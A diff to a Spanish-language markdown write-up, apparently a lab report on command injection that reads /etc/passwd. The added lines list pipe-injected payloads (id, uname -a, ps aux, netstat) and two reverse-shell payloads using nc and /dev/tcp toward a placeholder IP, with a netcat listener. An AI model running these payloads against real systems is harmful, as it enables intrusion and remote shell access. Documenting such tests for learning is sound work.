@@ -37,6 +37,17 @@ Se han validado los siguientes ataques para demostrar que, a pesar del filtrado 
 
 **Impacto Crítico**: El acceso al archivo **/etc/passwd** permite a un atacante conocer todos los usuarios del sistema, directorios home y shells asignadas, facilitando ataques de fuerza bruta o escalada de privilegios.
 
+#### Otros Payloads Básicos que pueden ser ejecutados son:
+* `127.0.0.1 | id`
+* `127.0.0.1 | uname -a`
+* `127.0.0.1 | ps aux`
+* `127.0.0.1 | netstat -anp`
+
+#### Payloads que nos permitirían obtener una shell inversa
+(COnfigurando el listener en un segundo terminal con: `nc -nlvp 4444`)
+* `127.0.0.1 | nc YOUR_IP 4444 -e /bin/bash`
+* `127.0.0.1 | bash -i >& /dev/tcp/DIRECCIONIP/4444 0>&1`
+
 #### EVIDENCIAS DE LA EJECUCIÓN DE LOS PAYLOADS
 
 <img width="588" height="284" alt="image" src="https://github.com/user-attachments/assets/c84a9aee-5530-46f0-8534-5e1687fbd79a" />
